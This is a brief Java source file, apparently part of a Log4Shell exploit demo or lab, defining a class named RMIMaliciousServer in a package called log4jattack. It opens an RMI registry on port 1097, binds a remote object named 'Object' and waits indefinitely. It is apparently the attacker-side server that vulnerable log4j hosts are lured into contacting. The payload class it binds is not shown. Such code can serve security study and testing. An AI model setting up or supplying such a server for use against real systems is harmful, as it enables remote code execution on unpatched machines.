package log4jattack;

import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.util.concurrent.CountDownLatch;

public class RMIMaliciousServer {

	public static void main(String[] args) throws RemoteException, AlreadyBoundException, InterruptedException {
		Registry registry = LocateRegistry.createRegistry(1097);
		registry.bind("Object", new RemoteImpl());
		System.out.println("RMI SERVER UP AND RUNNING");
		(new CountDownLatch(1)).await();		
	}

}
